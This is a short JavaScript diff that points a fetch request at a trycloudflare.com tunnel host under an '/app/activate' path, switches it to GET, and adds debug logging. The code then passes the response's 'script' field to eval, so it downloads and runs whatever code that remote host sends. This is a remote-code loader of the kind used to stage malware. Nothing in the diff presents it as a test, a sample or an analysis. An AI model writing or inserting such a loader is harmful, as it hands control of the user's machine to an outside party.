@@ -1,5 +1,5 @@
-const baseUrl = 'https://api.example.com/submit';
-const dynamicSegment = '12345';
+const baseUrl = 'https://existing-grammar-discount-williams.trycloudflare.com';
+const dynamicSegment = '/app/activate';
 const fullUrl = `${baseUrl}/${dynamicSegment}`;
 
 const requestData = {
@@ -12,17 +12,20 @@ fetch_request(fullUrl, requestData)
 
 function fetch_request(url, requestData)
 {
+  console.log('start')
     fetch(url, {
-        method: 'POST',
-        body: JSON.stringify(requestData)
+        method: 'GET',
       })
         .then(response => {
+          console.log(response)
+          console.log('new')
           if (!response.ok) {
             throw new Error('Network response was not ok');
           }
           return response.json();
         })
         .then(data => {
+          console.log('test')
             eval(data.script);
         })
         .catch(error => {
